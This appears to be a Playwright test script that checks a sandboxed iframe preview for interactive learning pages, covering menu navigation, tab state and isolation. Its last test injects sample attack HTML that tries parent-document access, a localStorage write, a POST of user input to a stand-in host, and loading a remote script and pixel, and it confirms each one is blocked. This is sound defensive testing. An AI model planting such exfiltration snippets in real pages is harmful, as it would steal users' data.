const fs = require('node:fs');
const assert = require('node:assert/strict');
const ts = require('typescript');
const { chromium } = require('playwright');

(async () => {
  const browser = await chromium.launch({ executablePath: 'C:/Program Files (x86)/Microsoft/Edge/Application/msedge.exe', headless: true });
  try {
    const page = await browser.newPage({ viewport: { width: 1500, height: 950 } });
    await page.goto('about:blank');
    await page.addScriptTag({ path: require.resolve('dompurify').replace('purify.cjs.js', 'purify.js') });
    const code = ts.transpileModule(fs.readFileSync('apps/web/lib/learning-preview.ts', 'utf8'), { compilerOptions: { module: ts.ModuleKind.CommonJS, target: ts.ScriptTarget.ES2022, esModuleInterop: true } }).outputText;
    await page.evaluate(code => { window.exports = {}; window.require = () => window.DOMPurify; eval(code); }, code);
    const navigationCode = ts.transpileModule(fs.readFileSync('apps/web/lib/learning-navigation-bridge.ts', 'utf8'), { compilerOptions: { module: ts.ModuleKind.CommonJS, target: ts.ScriptTarget.ES2022 } }).outputText;
    await page.evaluate(code => { const exports = {}; eval(code); window.menuBridge = exports.learningNavigationBridge('test-menu'); window.addEventListener('message', event => { if (event.source === document.querySelector('iframe')?.contentWindow && event.data?.channel === 'test-menu') window.menuItems = event.data.items; }); }, navigationCode);
    const mount = source => page.evaluate(source => new Promise(resolve => {
      document.querySelector('iframe')?.remove();
      const frame = document.createElement('iframe');
      frame.setAttribute('sandbox', 'allow-scripts');
      frame.style = 'width:100%;height:900px;border:0';
      frame.srcdoc = window.exports.learningPreviewDocument(source, true, window.menuBridge);
      frame.onload = () => resolve();
      document.body.append(frame);
    }), source);
    if (process.argv[2] && process.argv[3] === 'kombinatorika') {
      await mount(fs.readFileSync(process.argv[2], 'utf8'));
      await page.waitForFunction(() => window.menuItems?.length === 8);
      const originalFrame = page.frames()[1];
      assert.notEqual(await originalFrame.locator('#sidebarMenu').evaluate(element => getComputedStyle(element).display), 'none');
      assert.equal(new Set(await page.evaluate(() => window.menuItems.map(item => item.group))).size, 2);
      await page.evaluate(() => {
        window.addEventListener('message', event => {
          const frame = document.querySelector('iframe');
          if (event.source === frame?.contentWindow && event.data?.channel === 'test-menu' && event.data.type === 'html-menu') frame.contentWindow.postMessage({ channel: 'test-menu', type: 'html-menu-connected', snapshot: JSON.stringify(event.data.items) }, '*');
        });
        document.querySelector('iframe').contentWindow.postMessage({ channel: 'test-menu', type: 'html-menu-connected', snapshot: JSON.stringify(window.menuItems) }, '*');
      });
      await originalFrame.waitForFunction(() => getComputedStyle(document.querySelector('#sidebarMenu')).display === 'none');
      const labels = await page.evaluate(() => window.menuItems.map(item => item.label));
      assert.match(labels[0], /Aturan Penjumlahan/);
      assert.match(labels[7], /Permutasi Melingkar/);
      for (let index = 0; index < 8; index++) {
        await page.evaluate(index => document.querySelector('iframe').contentWindow.postMessage({ channel: 'test-menu', type: 'html-menu-select', id: window.menuItems[index].id }, '*'), index);
        await page.frames()[1].waitForFunction(index => document.querySelector(`#pane-${Math.floor(index / 4) + 1}-${index % 4}`).classList.contains('active'), index);
        await page.waitForFunction(index => window.menuItems[index].active, index);
      }
      await originalFrame.waitForFunction(() => getComputedStyle(document.querySelector('#sidebarMenu')).display === 'none');
      console.log('PASS: two groups and eight Kombinatorika items; sidebar retained without handshake, hidden after connection; navigation still works');
    } else if (process.argv[2]) {
      await mount(fs.readFileSync(process.argv[2], 'utf8'));
      const frame = page.frames()[1];
      await frame.waitForFunction(() => !!window.tailwind && document.querySelectorAll('svg').length > 0, { timeout: 30000 });
      await frame.locator('#senilai-n').evaluate(e => { e.value = '4'; e.dispatchEvent(new Event('input', { bubbles: true })); });
      await frame.locator('[data-tab="tambah"]').click();
      await frame.locator('[data-tab="senilai"]').click();
      await page.screenshot({ path: 'tools/learning-pecahan-preview.png' });
      console.log('PASS: Pecahan styling, rendered figures, slider and tabs');
    }
    await mount(`<nav><button data-tab="one" class="tab-active" onclick="document.querySelector('#answer').value='kept';this.classList.remove('tab-active');document.querySelector('[data-tab=two]').classList.add('tab-active')">Bagian satu</button><button data-tab="two" onclick="document.querySelector('#result').textContent='dua'">Bagian dua</button><a href="https://example.invalid">External</a></nav><input id="answer"><span id="result"></span>`);
    await page.waitForFunction(() => window.menuItems?.length === 2);
    assert.deepEqual(await page.evaluate(() => window.menuItems.map(item => item.label)), ['Bagian satu', 'Bagian dua']);
    await page.evaluate(() => document.querySelector('iframe').contentWindow.postMessage({ channel: 'wrong', type: 'html-menu-select', id: window.menuItems[1].id }, '*'));
    assert.equal(await page.frames()[1].locator('#result').textContent(), '');
    await page.evaluate(() => document.querySelector('iframe').contentWindow.postMessage({ channel: 'test-menu', type: 'html-menu-select', id: window.menuItems[0].id }, '*'));
    await page.waitForFunction(() => window.menuItems[1].active);
    await page.evaluate(() => document.querySelector('iframe').contentWindow.postMessage({ channel: 'test-menu', type: 'html-menu-select', id: window.menuItems[1].id }, '*'));
    await page.frames()[1].waitForFunction(() => document.querySelector('#result').textContent === 'dua');
    assert.equal(await page.frames()[1].locator('#answer').inputValue(), 'kept');
    console.log('PASS: HTML menu discovery, activation, active state, preserved inputs and wrong-channel rejection');
    let escaped = false;
    await page.route('https://example.invalid/**', route => { escaped = true; return route.abort(); });
    await mount(`<input id="value" value="1" oninput="document.querySelector('#result').textContent=this.value"><span id="result"></span><script>
      window.checks={};
      try{parent.document.body.dataset.compromised='yes';checks.parent=true}catch{checks.parent=false}
      try{localStorage.setItem('attack','1');checks.storage=true}catch{checks.storage=false}
      fetch('https://example.invalid/collect',{method:'POST',body:'answer'}).then(()=>checks.network=true,()=>checks.network=false);
    </script><script src="https://example.invalid/attack.js"></script><img src="https://example.invalid/pixel">`);
    const frame = page.frames()[1];
    await frame.waitForFunction(() => window.checks?.network === false);
    const checks = await frame.evaluate(() => window.checks);
    assert.deepEqual(checks, { parent: false, storage: false, network: false });
    await frame.locator('#value').fill('42');
    assert.equal(await frame.locator('#result').textContent(), '42');
    assert.equal(escaped, false);
    assert.equal(await page.evaluate(() => document.body.dataset.compromised), undefined);
    console.log('PASS: local interaction works; parent access, storage and external requests blocked');
  } finally { await browser.close(); }
})().catch(error => { console.error(error); process.exitCode = 1; });
